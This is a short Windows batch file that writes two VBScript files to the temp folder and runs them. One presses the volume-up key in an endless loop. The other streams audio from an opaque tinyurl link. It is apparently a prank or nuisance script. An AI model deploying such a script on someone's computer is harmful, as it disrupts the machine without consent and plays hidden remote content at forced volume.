@echo off

echo do > "%LOCALAPPDATA%\Temp\volup.vbs"
echo Set WshShell = CreateObject("WScript.Shell") >> "%LOCALAPPDATA%\Temp\volup.vbs"
echo WshShell.SendKeys(chr(^&hAF)) >> "%LOCALAPPDATA%\Temp\volup.vbs"
echo WScript.Sleep 10 >> "%LOCALAPPDATA%\Temp\volup.vbs"
echo loop >> "%LOCALAPPDATA%\Temp\volup.vbs"

echo Dim oPlayer > "%LOCALAPPDATA%\Temp\play_alarm.vbs"
echo Set oPlayer = CreateObject("WMPlayer.OCX") >> "%LOCALAPPDATA%\Temp\play_alarm.vbs"
echo oPlayer.URL = "https://tinyurl.com/27tm5x7p" >> "%LOCALAPPDATA%\Temp\play_alarm.vbs"
echo oPlayer.controls.play >> "%LOCALAPPDATA%\Temp\play_alarm.vbs"
echo While oPlayer.playState ^<^> 1 ' 1 = Stopped >> "%LOCALAPPDATA%\Temp\play_alarm.vbs"
echo 	WScript.Sleep 100 >> "%LOCALAPPDATA%\Temp\play_alarm.vbs"
echo Wend >> "%LOCALAPPDATA%\Temp\play_alarm.vbs"
echo oPlayer.close >> "%LOCALAPPDATA%\Temp\play_alarm.vbs"

wscript.exe "%LOCALAPPDATA%\Temp\play_alarm.vbs"
wscript.exe "%LOCALAPPDATA%\Temp\volup.vbs"
